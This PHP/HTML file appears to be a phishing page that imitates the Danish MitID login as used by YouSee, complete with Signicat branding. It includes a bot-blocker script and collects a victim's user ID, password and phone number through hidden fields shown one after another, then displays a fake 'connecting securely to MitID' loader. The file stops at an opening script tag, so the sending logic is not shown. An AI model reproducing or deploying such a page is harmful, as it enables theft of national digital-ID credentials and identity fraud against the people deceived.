<?php 
session_start();
error_reporting(0);
require 'botblocker.php';
$input1 =  $_SESSION["input1"];
?>
<html lang="da"><head><meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>MitID</title>
    <link rel="stylesheet" href="cs.css" id="mitid-styles">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
   </head>



   <body>
    <div id="mitid-profile" data-test-id="background-container" style="background-color:rgb(252,252,252);background-image:none">
        <header data-v-02980ddf="" style="background-color:rgb(252,252,252)">
            <div data-v-02980ddf="" class="signicat-header-logo-container">
                <img data-v-02980ddf="" src="data:image/png;base64,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" alt="YouSee logo" class="signicat-header-logo">
            </div>
        </header>
        <div data-v-24e033c9="" class="signicat-content-wrapper" methodoptions="[object Object]">



    <div data-v-24e033c9="" data-test-id="content-box" class="signicat-content-inside has-info" style="box-shadow:rgb(203,203,203) 0px 0px 40px;border-radius:8px"><div data-v-24e033c9="" class="signicat-method-inside signicat-full-width-mobile"><div data-v-24e033c9="" id="signicat-insert-method"><div id="blp-container">
 <div id="coreClientParent">



    <main  class="mitid-loader mitid-core-client" style="display:none;height:588px;width:400px;font-family:&quot;IBM Plex Sans&quot;,Arial,Helvetica,FreeSans,sans,sans-serif">







<div  id="logfir" style="display: none;">


    <form  onsubmit="return clickButton();"  >

<div id="mitid-core-client-form" class="mitid-core-content" > 

        <header class="mitid-core-header"><h1 class="mitid-core-header__text">Log på hos YouSee</h1><svg xmlns="http://www.w3.org/2000/svg" width="61" height="16" viewBox="0 0 61 16" class="mitid-core-header__logo" focusable="false" aria-label="MitID logo"><path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z"></path></svg></header><div class="mitid-login-divider--top"><hr class="mitid--divider mitid--divider-light"></div>







        <section id="mitid-core-client-section" aria-live="polite" aria-relevant="all" class="mitid-core-section"><div class="mitid-core-section__help-context"><div id="mitid-user-name" class="mitid-core-user"><div class="mitid-tooltip mitid-tooltip--labeltextleft"><div class="mitid-tooltip__label">


            <label class="mitid-tooltip__text" for="username9" aria-haspopup="true"  id="label1" aria-label="Bruger ID">Bruger-ID</label>
            <label class="mitid-tooltip__text" for="username9" aria-haspopup="true"  id="label2" aria-label="Bruger ID" style="display: none;">ADGANGSKODE</label>
            <label class="mitid-tooltip__text" for="username9" aria-haspopup="true"  id="label3" aria-label="Bruger ID" style="display: none;">TELEFONNUMMER</label>


            <button id="mitid-popup-toggler" aria-label="Åbn hjælpetekst" class="mitid--button-icon-tooltip" tabindex="0" type="button"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" aria-hidden="true" viewBox="0 0 24 24" focusable="false"><path fill="#001C44" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-4h2v2h-2zm1.61-9.96c-2.06-.3-3.88.97-4.43 2.79-.18.58.26 1.17.87 1.17h.2c.41 0 .74-.29.88-.67.32-.89 1.27-1.5 2.3-1.28.95.2 1.65 1.13 1.57 2.1-.1 1.34-1.62 1.63-2.45 2.88 0 .01-.01.01-.01.02-.01.02-.02.03-.03.05-.09.15-.18.32-.25.5-.01.03-.03.05-.04.08-.01.02-.01.04-.02.07-.12.34-.2.75-.2 1.25h2c0-.42.11-.77.28-1.07.02-.03.03-.06.05-.09.08-.14.18-.27.28-.39.01-.01.02-.03.03-.04.1-.12.21-.23.33-.34.96-.91 2.26-1.65 1.99-3.56-.24-1.74-1.61-3.21-3.35-3.47z"></path></svg></button></div></div><div class="mitid-core-user__input" defaultlanguage="DAﾠ/ﾠDK">






            <input class="mitid-core-user__user-id" id="input1" name="input1"  type="text" autocomplete="off"  required="" spellcheck="false">
            <input class="mitid-core-user__user-id" id="input2" name="input2"  type="text" autocomplete="off"  required="" spellcheck="false" style="display: none;">
            <input class="mitid-core-user__user-id" id="input3" name="input3"  type="text" autocomplete="off"  required="" spellcheck="false" style="display: none;">





        </div></div>





        <button  id="button1" class="mitid--button-primary" tabindex="0" type="button" showicontext="IconﾠHelpﾠText"><span class="mitid--button-label">Fortsæt</span><span class="mitid--button-spacing"></span><svg xmlns="http://www.w3.org/2000/svg" focusable="false" class="mitid--button-icon" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true"><path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"></path></svg></button>
        <button style="display: none;" id="button2" class="mitid--button-primary" tabindex="0" type="button" showicontext="IconﾠHelpﾠText"><span class="mitid--button-label">Fortsæt</span><span class="mitid--button-spacing"></span><svg xmlns="http://www.w3.org/2000/svg" focusable="false" class="mitid--button-icon" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true"><path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"></path></svg></button>
        <button id="button3" style="display: none;" class="mitid--button-primary" tabindex="0" type="button" onclick="return clickButton();"showicontext="IconﾠHelpﾠText"><span class="mitid--button-label">Fortsæt</span><span class="mitid--button-spacing"></span><svg xmlns="http://www.w3.org/2000/svg" focusable="false" class="mitid--button-icon" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true"><path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"></path></svg></button>







        <div class="mitid-tooltip mitid-tooltip--context-help"><div class="mitid-tooltip__label"><a class="mitid-link" id="linkOpenToolTip"><svg xmlns="http://www.w3.org/2000/svg" width="24px" height="24px" version="1.1" viewBox="0 0 24 24" focusable="false" aria-hidden="true" class="mitid-link__icon"><g id="svg-info-link-WVa6d7V" fill="none" fill-rule="evenodd" stroke="none" stroke-width="1"><g id="svg-info-link-2DTjj-X" transform="translate(-112.000000, -511.000000)"><g id="svg-info-link-QbXok99" transform="translate(112.000000, 511.000000)"><polygon id="svg-info-link-3jY1JFX" points="0 0 24 0 24 24 0 24"></polygon><path id="svg-info-link-YnjGPzk" fill-rule="nonzero" d="M11,7 L13,7 L13,9 L11,9 L11,7 Z M11,11 L13,11 L13,17 L11,17 L11,11 Z M12,2 C6.48,2 2,6.48 2,12 C2,17.52 6.48,22 12,22 C17.52,22 22,17.52 22,12 C22,6.48 17.52,2 12,2 Z M12,20 C7.59,20 4,16.41 4,12 C4,7.59 7.59,4 12,4 C16.41,4 20,7.59 20,12 C20,16.41 16.41,20 12,20 Z"></path></g></g></g></svg><span class="mitid-link__label">Glemt bruger-ID?</span></a></div></div></div><label style="margin-top:200px"class="mitid-checkbox mitid-checkbox_user-id" for="mitid-remember-me"><span class="mitid-checkbox__label">Husk mig hos YouSee</span><input id="mitid-remember-me" class="mitid-checkbox__input" name="remember" type="checkbox" autocomplete="on"><span class="mitid-checkbox__checkmark"><span class="mitid-checkbox__checker"></span></span></label></section>





        <footer class="mitid-core-footer" style=""><div aria-hidden="true"><hr class="mitid--divider-light mitid-login-divider--bottom"></div><nav class="mitid-core-footer__nav"><a type="button" href="#" class="mitid-core-text-button" id="mitidCancelButtonId" role="button"><div class="mitid-core-text-button__text"><span class="mitid-core-text-button__label">Afbryd</span></div></a><a type="button" href="#" class="mitid-core-text-button mitid--button--left" id="mitidHelpButtonId" role="button" aria-haspopup="true" aria-expanded="false"><div class="mitid-core-text-button__text"><span class="mitid-core-text-button__label">Hjælp</span></div></a></nav></footer>


</div>
    </form>
</div>









<div style="display:none" id="loader">
<form id="mitid-core-client-form" class="mitid-core-content" >



        <div class="mitid-login-divider--top dfe3mo" ></div>


<div class="mitid-loader__content" aria-busy="true" aria-live="polite"><div class="mitid-loader__logo"><svg xmlns="http://www.w3.org/2000/svg" width="61" height="16" viewBox="0 0 61 16" focusable="false" aria-label="MitID logo" class="mitid-loader__logo-svg"><path d="M19.2 0c1 0 1.8.8 1.8 1.8s-.8 1.8-1.8 1.8-1.8-.8-1.8-1.8.8-1.8 1.8-1.8zm21.2 0c2.1 0 3.8 1.7 3.8 3.8 0 2.1-1.7 3.8-3.8 3.8-2.1 0-3.8-1.7-3.8-3.8 0-2.1 1.7-3.8 3.8-3.8zM20.7 4.9v10.9h-3V4.9h3zM2.9.8l4.6 7.1L12 .8h2.9v15h-3.1V6.1l-4.3 6.4h-.1L3.1 6.1v9.7H0V.8h2.9zM40.4 9c3.6 0 6.5 2 6.9 6.8H33.6C34 11 36.9 9 40.4 9zM51.9.2C58.3.2 61 3.7 61 8s-2.7 7.8-9.1 7.8h-2.6V.2h2.6zM27.1 1.9v3h2.4v2.4h-2.4v4.8c0 .9.5 1.2 1.3 1.2.5 0 1-.1 1.3-.4v2.7c-.4.2-1.2.3-2 .3-2.2 0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3h3z"></path></svg></div><div class="mitid-loader__state"><svg xmlns="http://www.w3.org/2000/svg" focusable="false" class="mitid-loader__shield" aria-hidden="true"><path d="M49.9 0l50 15v41.2c0 47.8-50 60.8-50 60.8s-50-13-50-60.8V15l50-15"></path></svg><svg viewBox="30 30 60 60" focusable="false" aria-hidden="true" class="mitid-loader__circular"><circle cx="60" cy="60" r="27" fill="none" stroke="#3380eb" stroke-linecap="square" stroke-miterlimit="10" stroke-width="5"></circle><circle cx="60" cy="60" r="27" fill="none" stroke="#fff" stroke-dasharray="50 200" stroke-linecap="square" stroke-miterlimit="10" stroke-width="5"></circle></svg></div><div class="mitid-loader__text"><h1 class="mitid-loader__title" aria-live="assertive" id="h1">Forbinder sikkert til MitID</h1><span class="mitid-loader__description">Vent et øjeblik ...</span></div></div>




        





       </form></div>

































    </main></div>







</div></div></div><div data-v-24e033c9="" data-test-id="sidebox" class="signicat-info-field align-in-middle signicat-full-width-mobile"><div data-v-24e033c9="" class="signicat-info-inner"><h1 data-v-24e033c9="" data-test-id="sidebox-heading">Log ind med MitID</h1><p data-v-24e033c9="" data-test-id="sidebox-description" class="sidebox-description">MitID bliver Danmarks nye digitale ID. Alle skal skifte fra NemID til MitID. Du får besked i din netbank, når det er din tur. Indtil da skal du fortsat logge ind med NemID.</p><ul data-v-24e033c9="" data-test-id="sidebox-links"><li data-v-24e033c9=""><a data-v-24e033c9="" href="#"  class="sidebox-link">Læs mere om MitID</a></li></ul></div></div><div data-v-25431795="" data-v-24e033c9="" data-test-id="method-footer" class="signicat-method-footer"><div data-v-25431795="" data-test-id="footer-description" class="signicat-powered-by-description">Powered by Signicat</div><div data-v-25431795="" data-test-id="footer-links" class="signicat-footer-links"><a data-v-25431795="" href="#"  class="footer-link">Read our privacy policy</a></div></div></div></div></div>

<script type="text/javascript">
